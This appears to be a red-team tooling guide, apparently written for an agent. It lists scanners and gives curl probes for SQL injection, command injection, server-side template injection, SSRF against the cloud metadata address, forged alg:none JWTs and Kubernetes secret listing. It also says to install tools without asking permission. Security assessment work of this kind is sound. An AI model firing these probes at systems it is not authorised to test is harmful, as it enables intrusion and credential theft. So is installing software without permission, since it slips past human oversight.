# Security Tooling

Tools available for red team assessments. Install what you need — don't ask permission for tool installation.

---

## Tool Selection Principle

Use the lightest tool that proves the point. A `curl` command that demonstrates SQL injection is better than a full Burp Suite scan that reports the same thing.

---

## Static Analysis (Code)

| Tool | What It Does | Install | When to Use |
|------|-------------|---------|-------------|
| `semgrep` | Pattern-based code analysis | `pip install semgrep` | First pass on any codebase |
| `bandit` | Python security linter | `pip install bandit` | Python codebases |
| `gosec` | Go security checker | `go install github.com/securego/gosec/v2/cmd/gosec@latest` | Go codebases |
| `brakeman` | Ruby on Rails scanner | `gem install brakeman` | Rails apps |
| `eslint-plugin-security` | JS/TS security rules | `npm install eslint-plugin-security` | Node.js codebases |
| `trivy` | All-in-one scanner (code, deps, containers, IaC) | See trivy docs for install | Broad initial sweep |

### Usage Patterns

```bash
# Semgrep — broad sweep
semgrep --config=auto --severity=ERROR .

# Bandit — Python
bandit -r . -ll

# Trivy — filesystem scan
trivy fs --severity HIGH,CRITICAL .
```

---

## Secrets Detection

| Tool | What It Does | Install | When to Use |
|------|-------------|---------|-------------|
| `trufflehog` | Git history + filesystem secret scanning | `pip install trufflehog` or binary | Always — first thing on any repo |
| `gitleaks` | Git secret scanner | `go install github.com/gitleaks/gitleaks/v8@latest` | Git repos |
| `grep/ripgrep` | Pattern matching | Already installed | Quick targeted searches |

### Usage Patterns

```bash
# Trufflehog — scan entire git history
trufflehog git file://. --only-verified

# Gitleaks — scan repo
gitleaks detect -v

# Quick grep for common patterns
rg -i 'password\s*[:=]\s*["\x27]\S+' --glob '!*.lock' --glob '!node_modules'
rg 'AKIA[0-9A-Z]{16}' # AWS access keys
rg '-----BEGIN.*PRIVATE KEY-----'
```

---

## Dependency Scanning

| Tool | What It Does | Install | When to Use |
|------|-------------|---------|-------------|
| `npm audit` | Node.js vulnerability check | Built-in | Node.js projects |
| `pip-audit` | Python vulnerability check | `pip install pip-audit` | Python projects |
| `cargo audit` | Rust vulnerability check | `cargo install cargo-audit` | Rust projects |
| `grype` | Container + filesystem vuln scanner | Binary install | Container images |
| `trivy` | Multi-ecosystem scanner | Binary install | Broad scanning |

### Usage Patterns

```bash
# Node.js
npm audit --json

# Python
pip-audit --format json

# Container images
grype <image_name> --only-fixed
trivy image <image_name> --severity HIGH,CRITICAL
```

---

## Web Application Testing

| Tool | What It Does | Install | When to Use |
|------|-------------|---------|-------------|
| `curl` | HTTP requests | Already installed | Targeted endpoint testing |
| `httpie` | Human-friendly HTTP client | `pip install httpie` | Interactive exploration |
| `nuclei` | Template-based vuln scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` | Broad web scanning |
| `nikto` | Web server scanner | `apt install nikto` or Perl | Web server misconfiguration |
| `sqlmap` | SQL injection automation | `pip install sqlmap` | Confirmed SQLi exploitation |
| `ffuf` | Web fuzzer (dirs, params, vhosts) | `go install github.com/ffuf/ffuf/v2@latest` | Discovery and fuzzing |
| `wfuzz` | Web fuzzer | `pip install wfuzz` | Alternative to ffuf |

### Usage Patterns

```bash
# Test for SQL injection manually
curl -s "https://target/api/users?id=1' OR '1'='1" -v

# Directory brute-force
ffuf -u https://target/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,302,403

# Nuclei — template-based scanning
nuclei -u https://target -severity high,critical

# SQLMap — automated SQLi
sqlmap -u "https://target/api/users?id=1" --batch --level=3 --risk=2
```

---

## Network and Infrastructure

| Tool | What It Does | Install | When to Use |
|------|-------------|---------|-------------|
| `nmap` | Port scanning and service detection | `apt install nmap` | Network reconnaissance |
| `testssl.sh` | TLS configuration analysis | Git clone or package | TLS/SSL assessment |
| `kubectl` | Kubernetes interaction | Binary install | K8s cluster assessment |
| `docker` | Container inspection | Package install | Container security |

### Usage Patterns

```bash
# Port scan
nmap -sV -sC target_host

# TLS assessment
testssl.sh target_host:443

# Kubernetes — check RBAC
kubectl auth can-i --list
kubectl get secrets --all-namespaces
```

---

## Manual Testing Techniques

Not everything needs a tool. These patterns work with `curl` alone.

### Authentication Testing

```bash
# JWT with alg:none
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' > /tmp/jwt_header
echo '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' > /tmp/jwt_payload
echo -n "$(cat /tmp/jwt_header).$(cat /tmp/jwt_payload)." # JWT with no signature

# Session fixation
curl -b "session=known_value" https://target/login -d "user=victim&pass=..."

# IDOR testing
curl -H "Authorization: Bearer $TOKEN" https://target/api/users/1
curl -H "Authorization: Bearer $TOKEN" https://target/api/users/2  # Same token, different user
```

### Injection Testing

```bash
# SQL injection probing
curl "https://target/api/search?q=test'"                    # Error?
curl "https://target/api/search?q=test' OR '1'='1"          # More results?
curl "https://target/api/search?q=test' AND SLEEP(5)--"     # Time delay?

# Command injection
curl "https://target/api/ping?host=;id"
curl "https://target/api/ping?host=\$(whoami)"

# SSTI
curl "https://target/api/render?template={{7*7}}"            # Returns 49?
curl "https://target/api/render?template=\${7*7}"            # Alternative syntax
```

### SSRF Testing

```bash
# Cloud metadata
curl "https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target/api/fetch?url=http://[::ffff:169.254.169.254]/"  # IPv6 bypass

# Internal services
curl "https://target/api/fetch?url=http://localhost:8080/admin"
curl "https://target/api/fetch?url=http://internal-service.namespace.svc.cluster.local/"
```

---

## Wordlists

For fuzzing and brute-force, use these sources:

- **SecLists** — `git clone https://github.com/danielmiessler/SecLists.git`
- **Built-in** — `/usr/share/wordlists/` on Kali-based systems
- **Custom** — Build from target's own documentation, error messages, JS files

---

## Tool Installation Priority

When starting an assessment, install in this order:

1. **Always**: `trufflehog` or `gitleaks` (secrets are the easiest wins)
2. **For code**: `semgrep` (broadest static analysis coverage)
3. **For deps**: ecosystem-specific audit tool (`npm audit`, `pip-audit`, etc.)
4. **For web**: `nuclei` (template-based, high signal-to-noise)
5. **As needed**: Everything else based on what recon reveals

---

*The best tool is the one that proves the vulnerability. Sometimes that's curl.*
